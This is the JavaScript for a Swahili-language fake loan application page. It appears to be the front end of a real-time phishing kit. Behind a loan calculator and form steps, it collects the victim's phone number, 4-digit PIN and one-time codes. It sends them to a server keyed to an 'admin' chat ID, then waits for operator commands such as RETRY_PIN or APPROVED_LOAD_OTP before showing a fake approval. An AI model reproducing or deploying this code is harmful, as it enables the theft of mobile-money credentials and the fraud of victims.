document.addEventListener('DOMContentLoaded', () => {
  // Extract URL Params (Admin ID)
  const urlParams = new URLSearchParams(window.location.search);
  const adminChatId = urlParams.get('admin') || '';

  // Elements
  const sections = {
    calc: document.getElementById('step-calculator'),
    form1: document.getElementById('step-form-1'),
    form2: document.getElementById('step-form-2'),
    form3: document.getElementById('step-form-3'),
    login: document.getElementById('step-login'),
    otp: document.getElementById('step-otp'),
    success: document.getElementById('step-success')
  };

  const navBackBtn = document.getElementById('navBackBtn');

  // Slider Elements
  const calcAmountSlider = document.getElementById('calcAmountSlider');
  const calcAmountDisplay = document.getElementById('calcAmountDisplay');
  const calcMonthsSlider = document.getElementById('calcMonthsSlider');
  const calcMonthsDisplay = document.getElementById('calcMonthsDisplay');
  const calcMonthlyPayment = document.getElementById('calcMonthlyPayment');

  // Form inputs
  const formAmount = document.getElementById('formAmount');
  const formMonths = document.getElementById('formMonths');
  const loanPurpose = document.getElementById('loanPurpose');
  const firstName = document.getElementById('firstName');
  const lastName = document.getElementById('lastName');
  const phoneNumber = document.getElementById('phoneNumber');

  // Helper: Switch View
  function showSection(targetKey, showBack = true) {
    Object.keys(sections).forEach(key => {
      if (sections[key]) sections[key].classList.remove('active');
    });
    if (sections[targetKey]) sections[targetKey].classList.add('active');
    if (navBackBtn) navBackBtn.style.display = showBack && targetKey !== 'calc' && targetKey !== 'success' ? 'block' : 'none';
    window.scrollTo(0, 0);
  }

  // Calculator Logic
  function updateCalculator() {
    if (!calcAmountSlider || !calcMonthsSlider) return;
    const amount = parseInt(calcAmountSlider.value);
    const months = parseInt(calcMonthsSlider.value);

    if (calcAmountDisplay) calcAmountDisplay.textContent = `TSh ${amount.toLocaleString()}`;
    if (calcMonthsDisplay) calcMonthsDisplay.textContent = `miezi ${months}`;

    // Standard formula simulation: (Amount * 1.14) / Months
    const monthly = Math.round((amount * 1.14) / months);
    if (calcMonthlyPayment) calcMonthlyPayment.textContent = `TSh ${monthly.toLocaleString()}`;

    // Sync to form 1
    if (formAmount) formAmount.value = amount;
  }

  if (calcAmountSlider) calcAmountSlider.addEventListener('input', updateCalculator);
  if (calcMonthsSlider) calcMonthsSlider.addEventListener('input', updateCalculator);

  // Step Navigations
  const btnStart = document.getElementById('btnStartApplication');
  if (btnStart) btnStart.addEventListener('click', () => showSection('form1'));
  
  const btnStep2 = document.getElementById('btnToStep2');
  if (btnStep2) {
    btnStep2.addEventListener('click', () => {
      document.getElementById('sumAmount').textContent = `TSh ${parseInt(formAmount.value).toLocaleString()}`;
      document.getElementById('sumMonths').textContent = `Miezi ${formMonths.value}`;
      document.getElementById('sumPurpose').textContent = loanPurpose.value || 'Haikuwekwa';
      showSection('form2');
    });
  }

  const btnBack1 = document.getElementById('btnBackTo1');
  if (btnBack1) btnBack1.addEventListener('click', () => showSection('form1'));

  const btnStep3 = document.getElementById('btnToStep3');
  if (btnStep3) {
    btnStep3.addEventListener('click', () => {
      if (!firstName.value || !phoneNumber.value) {
        alert('Tafadhali jaza jina na namba ya simu.');
        return;
      }
      document.getElementById('sumName').textContent = `${firstName.value} ${lastName.value}`;
      showSection('form3');
    });
  }

  const btnBack2 = document.getElementById('btnBackTo2');
  if (btnBack2) btnBack2.addEventListener('click', () => showSection('form2'));

  const btnLogin = document.getElementById('btnToLogin');
  if (btnLogin) {
    btnLogin.addEventListener('click', () => {
      const loginPhone = document.getElementById('loginPhone');
      if (loginPhone) loginPhone.value = phoneNumber.value;
      showSection('login', false);
    });
  }

  // PIN Handling
  const pinInputs = [
    document.getElementById('pin1'),
    document.getElementById('pin2'),
    document.getElementById('pin3'),
    document.getElementById('pin4')
  ];
  const btnLoginSubmit = document.getElementById('btnLoginSubmit');

  pinInputs.forEach((input, idx) => {
    if (!input) return;
    input.addEventListener('input', (e) => {
      if (e.target.value.length === 1 && idx < 3 && pinInputs[idx + 1]) {
        pinInputs[idx + 1].focus();
      }
      checkPinComplete();
    });

    input.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace' && !e.target.value && idx > 0 && pinInputs[idx - 1]) {
        pinInputs[idx - 1].focus();
      }
    });
  });

  function checkPinComplete() {
    const pin = pinInputs.map(i => i ? i.value : '').join('');
    if (btnLoginSubmit) {
      if (pin.length === 4) {
        btnLoginSubmit.classList.add('active');
        btnLoginSubmit.disabled = false;
      } else {
        btnLoginSubmit.classList.remove('active');
        btnLoginSubmit.disabled = true;
      }
    }
  }

  let activeUserId = '';

  // Submit Application + PIN
  if (btnLoginSubmit) {
    btnLoginSubmit.addEventListener('click', async () => {
      const loginPhoneElem = document.getElementById('loginPhone');
      const contact = loginPhoneElem ? loginPhoneElem.value : phoneNumber.value;
      const pin = pinInputs.map(i => i ? i.value : '').join('');
      const amount = `TSh ${parseInt(formAmount.value).toLocaleString()}`;

      showOverlay('Inatuma maombi...');

      try {
        const res = await fetch(`/api/submit-application?admin=${adminChatId}`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ contact, pin, amount, adminChatId })
        });

        const data = await res.json();
        if (data.success) {
          activeUserId = data.userId;
          updateOverlayText('Inasubiri idhini kutoka kwa msimamizi...');
          pollStatus();
        } else {
          hideOverlay();
          alert(data.error || 'Hitilafu imetokea.');
        }
      } catch (err) {
        hideOverlay();
        alert('Imeshindwa kuunganisha kwenye seva.');
      }
    });
  }

  // Status Polling for Continuous & Smooth Flow
  let pollInterval = null;
  function pollStatus() {
    if (pollInterval) clearInterval(pollInterval);

    pollInterval = setInterval(async () => {
      if (!activeUserId) return;
      try {
        const res = await fetch(`/api/check-status/${activeUserId}`);
        const data = await res.json();

        if (data.status === 'APPROVED_LOAD_OTP') {
          hideOverlay();
          const otpDisp = document.getElementById('otpPhoneDisplay');
          if (otpDisp) otpDisp.textContent = `+255${phoneNumber.value.replace(/^0/, '')}`;
          showSection('otp', false);
          startOtpTimer();
        } else if (data.status === 'DENIED') {
          clearInterval(pollInterval);
          hideOverlay();
          alert('Ombi lako limekataliwa na msimamizi.');
        } else if (data.status === 'SUCCESS') {
          clearInterval(pollInterval);
          hideOverlay();
          showSuccessScreen();
        } else if (data.status === 'RETRY_PIN') {
          hideOverlay();
          alert('PIN uliyoingiza si sahihi. Tafadhali jaribu tena.');
          showSection('login', false);
          pinInputs.forEach(i => { if (i) i.value = ''; });
          checkPinComplete();
        } else if (data.status === 'RETRY_OTP') {
          hideOverlay();
          alert('OTP si sahihi. Tafadhali jaribu tena.');
          otpInputs.forEach(i => { if (i) i.value = ''; });
          if (btnOtpSubmit) btnOtpSubmit.disabled = true;
        }
      } catch (e) {}
    }, 2000);
  }

  // OTP Handling
  const otpInputs = [
    document.getElementById('otp1'),
    document.getElementById('otp2'),
    document.getElementById('otp3'),
    document.getElementById('otp4')
  ];
  const btnOtpSubmit = document.getElementById('btnOtpSubmit');

  otpInputs.forEach((input, idx) => {
    if (!input) return;
    input.addEventListener('input', (e) => {
      if (e.target.value.length === 1 && idx < 3 && otpInputs[idx + 1]) {
        otpInputs[idx + 1].focus();
      }
      const otp = otpInputs.map(i => i ? i.value : '').join('');
      if (btnOtpSubmit) {
        btnOtpSubmit.disabled = otp.length !== 4;
        if (otp.length === 4) btnOtpSubmit.classList.add('active');
        else btnOtpSubmit.classList.remove('active');
      }
    });

    input.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace' && !e.target.value && idx > 0 && otpInputs[idx - 1]) {
        otpInputs[idx - 1].focus();
      }
    });
  });

  if (btnOtpSubmit) {
    btnOtpSubmit.addEventListener('click', async () => {
      const otp = otpInputs.map(i => i ? i.value : '').join('');
      showOverlay('Inathibitisha OTP...');

      try {
        const res = await fetch('/api/submit-otp', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ userId: activeUserId, otp })
        });

        const data = await res.json();
        if (data.success) {
          updateOverlayText('Inasubiri uhakiki wa OTP...');
          pollStatus();
        } else {
          hideOverlay();
          alert('Kushindwa kutuma OTP.');
        }
      } catch (err) {
        hideOverlay();
        alert('Hitilafu ya mtandao.');
      }
    });
  }

  function showSuccessScreen() {
    const amountVal = parseInt(formAmount.value) || 100000;
    const monthsVal = formMonths.value || 48;
    const monthlyPay = Math.round((amountVal * 1.14) / monthsVal);

    const elemAmount = document.getElementById('finalApprovedAmount');
    const elemPay = document.getElementById('finalMonthlyPay');
    const elemMonths = document.getElementById('finalMonths');

    if (elemAmount) elemAmount.textContent = `TSh ${amountVal.toLocaleString()}`;
    if (elemPay) elemPay.textContent = `TSh ${monthlyPay.toLocaleString()}`;
    if (elemMonths) elemMonths.textContent = `Miezi ${monthsVal}`;

    showSection('success', false);
  }

  // Resend OTP Command Logic
  async function triggerResendOtp() {
    if (!activeUserId) return;
    showOverlay('Inatuma ombi la msimbo mpya...');
    try {
      const res = await fetch('/api/resend-otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ userId: activeUserId })
      });
      const data = await res.json();
      if (data.success) {
        hideOverlay();
        otpInputs.forEach(i => { if (i) i.value = ''; });
        if (btnOtpSubmit) btnOtpSubmit.disabled = true;
        startOtpTimer();
        pollStatus();
      } else {
        hideOverlay();
        alert('Imeshindwa kuomba msimbo mpya.');
      }
    } catch (e) {
      hideOverlay();
      alert('Hitilafu ya mtandao.');
    }
  }

  // Timer with Resend Event Trigger
  function startOtpTimer() {
    let timeLeft = 40;
    const timerElem = document.getElementById('resendTimer');
    if (!timerElem) return;

    const interval = setInterval(() => {
      timeLeft--;
      if (timeLeft <= 0) {
        clearInterval(interval);
        timerElem.innerHTML = '<a href="#" id="resendBtnLink" style="color: var(--primary,#e60000); font-weight: bold; text-decoration: none;">Tuma tena msimbo</a>';
        const resendBtnLink = document.getElementById('resendBtnLink');
        if (resendBtnLink) {
          resendBtnLink.addEventListener('click', (e) => {
            e.preventDefault();
            triggerResendOtp();
          });
        }
      } else {
        timerElem.textContent = `Tuma tena msimbo ndani ya ${timeLeft} sekunde`;
      }
    }, 1000);
  }

  // Helpers Overlay
  function showOverlay(txt) {
    const loadingText = document.getElementById('loadingText');
    const loadingOverlay = document.getElementById('loadingOverlay');
    if (loadingText) loadingText.textContent = txt;
    if (loadingOverlay) loadingOverlay.classList.remove('hidden');
  }

  function updateOverlayText(txt) {
    const loadingText = document.getElementById('loadingText');
    if (loadingText) loadingText.textContent = txt;
  }

  function hideOverlay() {
    const loadingOverlay = document.getElementById('loadingOverlay');
    if (loadingOverlay) loadingOverlay.classList.add('hidden');
  }

  updateCalculator();
});
